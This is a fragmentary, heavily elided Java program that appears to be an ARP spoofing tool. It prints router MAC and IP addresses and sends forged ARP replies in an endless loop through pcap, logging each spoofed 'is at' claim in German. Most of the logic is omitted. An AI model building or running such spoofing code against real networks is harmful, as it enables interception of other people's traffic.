...
public static Enumeration ee;
       ...
       public static void main(String[] args) {
           ...
           if(args.length<3) {
               ...
               System.out.println("[***] ROUTER_MAC: "+asString(RouterMacBytes));
               ...
               System.out.println("[***] ROUTER_IP: "+asString(RouterIpBytes));
           ...
           while(true) {
                   ...
                   */
                   ...
                   if (pcap.sendPacket(bb) != Pcap.OK) { 
                           ...
                           c++;    
                           System.out.println("["+ft.format(dNow)+"] ArpReply #" + c + ": '" + RouterIp + " is at " + asString(spoofed_target_mac) + "' an " + asString(routermac) + " gesendet.");
                           System.out.flush();
